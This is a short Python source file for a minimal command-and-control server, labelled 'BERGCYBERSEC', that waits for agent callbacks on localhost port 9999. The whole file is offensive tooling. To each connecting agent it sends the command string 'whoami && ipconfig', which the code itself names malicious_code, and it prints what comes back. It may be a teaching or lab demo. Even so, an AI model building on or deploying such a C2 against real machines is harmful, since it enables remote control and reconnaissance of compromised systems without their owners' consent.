import socketserver

class C2(socketserver.BaseRequestHandler):

	def handle(self):
		self.malicious_code = "whoami && ipconfig"
		if self.request.recv(1024):
			print("Agent callback @ {}".format(self.client_address[0]))
			self.request.sendall(bytes(self.malicious_code, "utf-8"))
			print("Sending malicious code to agent @ {}".format(self.client_address[0]))
		if self.request.recv(1024):
			print(str(self.request.recv(1024)))

if __name__ == "__main__":
	HOST,PORT = "127.0.0.1", 9999
	with socketserver.TCPServer((HOST, PORT), C2) as c2:
		print("BERGCYBERSEC Command and Control Server is running...")
		c2.serve_forever()
